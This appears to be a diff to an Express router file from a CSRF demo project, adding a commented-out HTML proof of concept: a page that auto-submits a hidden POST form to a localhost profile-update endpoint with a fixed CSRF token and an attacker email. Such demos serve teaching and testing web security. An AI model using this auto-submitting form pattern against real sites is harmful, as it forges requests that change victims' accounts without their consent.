@@ -23,6 +23,25 @@ router.get('/', function(req, res) {
   alert(`Your session ID is: ${sessionId}`);
 </script> */}
 
+
+// <!DOCTYPE html>
+// <html>
+//   <head>
+//     <script>
+//       window.onload = function () {
+//         document.forms[0].submit();
+//       };
+//     </script>
+//   </head>
+//   <body>
+//     <form action="http://localhost:40007/updateProfile" method="POST">
+//       <input type="hidden" name="_csrf" value="IJrMXDye-KzAAkJH2nCpjmvCegBbRfYJ-MKA" />
+//       <input type="text" name="username" value="attacker@example.com" />
+//     </form>
+//   </body>
+// </html>
+
+
 router.post('/', function(req, res) {
 
     const csrfToken = req.csrfToken();
